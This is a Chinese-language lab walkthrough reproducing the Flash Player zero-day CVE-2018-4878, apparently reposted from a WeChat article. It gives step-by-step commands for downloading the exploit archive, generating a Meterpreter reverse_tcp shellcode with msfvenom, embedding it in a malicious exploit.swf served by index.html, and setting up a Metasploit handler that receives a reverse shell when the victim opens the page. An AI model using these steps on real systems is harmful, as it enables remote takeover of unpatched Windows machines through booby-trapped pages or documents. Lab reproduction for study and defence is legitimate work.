# Flash 0day漏洞复现（CVE-2018-4878）

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAxMjE3ODU3MQ==&mid=2650445891&idx=4&sn=4e7df6892744996ff5f58e414c854629&chksm=83bbfda7b4cc74b196467493471dcc44eaf2c38c68fe73e27bbb2e8d928a2c9e59fb6139fe33&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650445891&idx=4&sn=4e7df6892744996ff5f58e414c854629&chksm=83bbfda7b4cc74b196467493471dcc44eaf2c38c68fe73e27bbb2e8d928a2c9e59fb6139fe33&scene=27#wechat_redirect)

### 0x01 前言  

Adobe公司在当地时间2018年2月1日发布了一条安全公告：

https://helpx.adobe.com/security/products/flash-player/apsa18-01.html

公告称一个新的Flash 0Day漏洞（CVE-2018-4878）已经存在野外利用，可针对Windows用户发起定向攻击。攻击者可以诱导用户打开包含恶意 Flash 代码文件的 Microsoft Office 文档、网页、垃圾电子邮件等。

### 0x02 漏洞影响

Flash Player当前最新版本28.0.0.137以及之前的所有版本

### 0x03 漏洞复现

环境测试：

攻击机：kali

目标靶机：win7x64 +IE8.0+FLASH player28.0.0.137

1.下载cve-2018-4878的脚本利用

```
wget https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar
```

2.解压压缩文件后，可看到cve-2018-4878.py和exploit.swf

![](../Images/dc7fd77e472b7676dad80820cc226068.png)

3.我们需要对cve-2018-4878.py进行修改，原作者将代码中的stageless变量改成了true，正确的应该改成：`stageless = False`。

附上原作者的exp地址：https://github.com/anbai-inc/CVE-2018-4878.git

![](../Images/92c19d30172f1433d8b682104a539a89.png)

4.其次需要修改替换原来弹计算器的shellcode  
![](../Images/5dcdbf028df1ecb5da34652aafff3d85.png)

5.在kali下生成msf的shellcode:

```
msfvenom  -p   windows/meterpreter/reverse_tcp   lhost=your host  lport=your port  -f  python>shellcode.txt
```

![](../Images/c84c435dba5b967dc430da928276234c.png)

6.将生成的shellcode替换掉原有cve-2018-4878.py中的shelldoce即可  
![](../Images/d1d28dfeeaa1d218f7b6cfdf32c0faa5.png)

7.在kal下执行cve-2018-4878.py,这里需要和index.html在一个目录下，即可生成恶意的exploit.swf  
![](../Images/a06039410f796c49c7219c3d0f4503fa.png)

8.这里为了演示我将index.html和exploit.swf一同拷贝到目标靶机win7x64上，在ie浏览器下打开（也可以通过搭建web服务器的形式将index.html和exploit.swf放在web目录下,访问地址来打开）。  
![](../Images/d3b512057985bcfbb6fafd03c7228444.png)

9.在msf 下进行监听设置

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload  windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost  10.0.0.217
msf exploit(handler) > set lport  443
msf exploit(handler) > exploit
```

![](../Images/912b81c9f79e0531d787c80e7cc6a2c1.png)

10.当打开目标恶意的index.html页面时，即可触发反弹shell  
![](../Images/df1f306f88c949f6f489c0cf701df442.png)
